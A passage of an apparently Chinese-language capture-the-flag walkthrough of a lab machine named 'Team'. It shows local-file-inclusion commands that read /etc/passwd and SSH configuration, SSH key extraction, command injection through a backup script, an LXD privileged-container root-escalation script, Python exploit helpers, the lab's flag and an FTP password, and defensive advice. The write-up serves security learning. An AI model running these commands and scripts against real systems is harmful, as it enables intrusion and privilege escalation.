1.2 Web 目录枚举

访问 http://10.48.147.235 显示 Apache 默认页面，页面源码中包含注释提示域名 team.thm。

将 team.thm 和 dev.team.thm 添加到 /etc/hosts：

10.48.147.235 team.thm dev.team.thm

1.3 虚拟主机发现

访问 http://team.thm，目录扫描发现 /scripts/ 目录：

gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt

二、漏洞利用

2.1 本地文件包含 (LFI)

漏洞位置： http://dev.team.thm/script.php?page=

参数： page 存在本地文件包含漏洞

2.1.1 读取系统文件

# 读取 /etc/passwd
curl "http://dev.team.thm/script.php?page=/etc/passwd"

# 读取 SSH 配置
curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"

2.1.2 提取 SSH 私钥

通过 LFI 读取 /etc/ssh/sshd_config 时，发现文件末尾以注释形式包含了 dale 用户的 SSH 私钥：

curl -s "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config" | grep -A 100 "BEGIN"

将提取到的私钥保存为 dale_id_rsa：

# 保存私钥（示例结构）
cat > dale_id_rsa << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[私钥内容]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 dale_id_rsa

2.1.3 SSH 登录获取 User Flag

ssh -i dale_id_rsa -o StrictHostKeyChecking=no dale@10.48.147.235

登录后获取 User Flag：

dale@team:~$ cat /home/dale/user.txt
THM{6Y0TXHz7c2d}

2.2 FTP 凭据泄露

2.2.1 发现 FTP 凭据

通过 LFI 读取 Web 目录下的脚本文件：

curl -s "http://dev.team.thm/script.php?page=/var/www/team.thm/scripts/script.old"

发现 FTP 凭据：

用户名: ftpuser
密码: T3@m$h@r3

2.2.2 FTP 登录验证

ftp 10.48.147.235
# 用户名: ftpuser
# 密码: T3@m$h@r3

FTP 中 /home/ftpuser/workshare/New_site.txt 提到了 dev 子域名和 id_rsa 策略。

三、权限提升

3.1 发现命令注入漏洞

3.1.1 枚举用户目录

# 查看 gyles 用户目录
ls -la /home/gyles/

发现 /home/gyles/admin_checks 脚本，该脚本属于 gyles 用户且具有执行权限。

3.1.2 分析 admin_checks 脚本

cat /home/gyles/admin_checks

脚本内容：

#!/bin/bash
printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
printf "Stats have been backed up\n"

关键发现： 第 10 行 $error 2>/dev/null 存在命令注入漏洞，用户输入直接被当作命令执行。

3.1.3 命令注入限制

bash 在变量展开后不会重新解析重定向和管道符，因此 $error 只支持简单命令，不支持 >、>>、|、<< 等。

可行的注入方式：

# 直接执行命令
id
whoami
ls -la /root

# 执行脚本文件
bash /tmp/script.sh

3.2 发现 LXD 组提权路径

id gyles
# uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)

gyles 用户属于 lxd 组（GID 108），可以通过 LXC 容器实现特权提升。

3.3 准备 LXC 镜像

3.3.1 下载 Alpine 最小根文件系统

在攻击机上下载 Alpine minirootfs：

wget https://dl-cdn.alpinelinux.org/alpine/v3.15/releases/x86_64/alpine-minirootfs-3.15.0-x86_64.tar.gz -O alpine.tgz

3.3.2 上传镜像到靶机

scp -i dale_id_rsa -o StrictHostKeyChecking=no alpine.tgz dale@10.48.147.235:/tmp/alpine.tgz

3.3.3 创建带元数据的 LXC 镜像

LXC 需要包含 metadata.yaml 的镜像格式，直接使用 raw rootfs 会导致导入静默失败：

# 在靶机上执行
mkdir -p /tmp/lxc_build/rootfs
cd /tmp/lxc_build

# 解压 rootfs
tar xzf /tmp/alpine.tgz -C rootfs/

# 创建 metadata.yaml
cat > metadata.yaml << 'EOF'
architecture: x86_64
creation_date: 1638300000
properties:
 architecture: x86_64
 description: Alpine 3.15 x86_64
 os: Alpine
 release: "3.15"
EOF

# 打包为 LXC 格式镜像
tar czf /tmp/alpine_lxc.tgz metadata.yaml rootfs/
chmod 644 /tmp/alpine_lxc.tgz

3.4 编写提权脚本

由于通过管道运行 admin_checks 时 snap 路径不在 PATH 中，需要编写脚本显式设置环境变量：

privesc.sh：

#!/bin/bash
export PATH=/snap/bin:$PATH
export LXD_DIR=/var/snap/lxd/common/lxd

# 清理之前的尝试
lxc delete privesc --force 2>/dev/null
lxc image delete myimage 2>/dev/null

# 导入镜像
lxc image import /tmp/alpine_lxc.tgz --alias myimage 2>&1

# 验证镜像
lxc image list 2>&1

# 创建特权容器
lxc init myimage privesc -c security.privileged=true 2>&1

# 挂载宿主机根目录
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true 2>&1

# 启动容器
lxc start privesc 2>&1

# 等待容器启动
sleep 3

# 读取 Root Flag
lxc exec privesc -- cat /mnt/root/root/root.txt 2>&1

# 复制到可访问位置（备用）
lxc exec privesc -- cat /mnt/root/root/root.txt > /tmp/root_flag 2>/dev/null
chmod 644 /tmp/root_flag 2>/dev/null

上传脚本到靶机：

scp -i dale_id_rsa -o StrictHostKeyChecking=no privesc.sh dale@10.48.147.235:/tmp/privesc.sh

四、关键脚本汇总

4.1 LFI 枚举脚本

import requests

target = "http://dev.team.thm/script.php"
files_to_read = [
    "/etc/passwd",
    "/etc/ssh/sshd_config",
    "/var/www/team.thm/scripts/script.txt",
    "/var/www/team.thm/scripts/script.old",
]

for f in files_to_read:
    resp = requests.get(target, params={"page": f})
    print(f"=== {f} ===")
    print(resp.text[:2000])
    print()

4.2 admin_checks 命令注入辅助脚本

import subprocess

def run_as_gyles(cmd, target="10.48.147.235", key="dale_id_rsa"):
    """通过 admin_checks 以 gyles 身份执行命令"""
    ssh_cmd = f"""
    ssh -i {key} -o StrictHostKeyChecking=no dale@{target} "
    echo -e 'test\\n{cmd} 2>&1' | sudo -u gyles /home/gyles/admin_checks 2>&1
    "
    """
    result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=120)
    return result.stdout

# 使用示例
print(run_as_gyles("id"))
print(run_as_gyles("ls -la /home/gyles"))

4.3 Python pexpect 版本（本地执行）

import pexpect

def run_as_gyles(cmd, timeout=30):
    """通过 pexpect 与 admin_checks 交互"""
    child = pexpect.spawn('sudo -u gyles /home/gyles/admin_checks', timeout=timeout)
    child.expect('Enter name of person backing up the data:')
    child.sendline('test')
    child.expect("Enter 'date' to timestamp the file:")
    child.sendline(cmd)
    child.expect(pexpect.EOF)
    return child.before.decode()

# 使用示例
result = run_as_gyles('id')
print(result)

五、漏洞总结

漏洞类型 位置 危害等级 说明
本地文件包含 (LFI) dev.team.thm/script.php?page= 高 可读取任意系统文件，泄露 SSH 私钥
信息泄露 /etc/ssh/sshd_config 高 SSH 私钥以注释形式存储在配置文件中
命令注入 /home/gyles/admin_checks 高 $error 变量直接执行用户输入
不安全的组权限 gyles 属于 lxd 组 严重 可通过 LXC 特权容器获取 root 权限
凭据泄露 /var/www/team.thm/scripts/script.old 中 FTP 明文密码硬编码在脚本中

六、攻击链路图

Apache 默认页面 → 发现域名 team.thm
        ↓
目录枚举 → /scripts/ 目录
        ↓
子域名枚举 → dev.team.thm
        ↓
LFI 漏洞 → 读取 /etc/ssh/sshd_config
        ↓
提取 SSH 私钥 → SSH 登录 dale 用户 → User Flag
        ↓
枚举系统 → 发现 admin_checks 命令注入
        ↓
发现 lxd 组 → 上传 Alpine 镜像
        ↓
命令注入执行提权脚本 → LXC 特权容器 → Root Flag

七、防御建议

  1. 修复 LFI 漏洞： 对 page 参数进行白名单过滤，禁止路径遍历
  2. 移除敏感信息： 不要在 SSH 配置文件中存储私钥
  3. 修复命令注入： 不要将用户输入直接传递给 shell 执行，使用白名单验证
  4. 最小权限原则： 不要将普通用户加入 lxd 组，除非必要
  5. 凭据管理： 不要在代码文件中硬编码密码，使用环境变量或密钥管理服务
  6. 文件权限： 敏感脚本文件应设置适当的访问权限
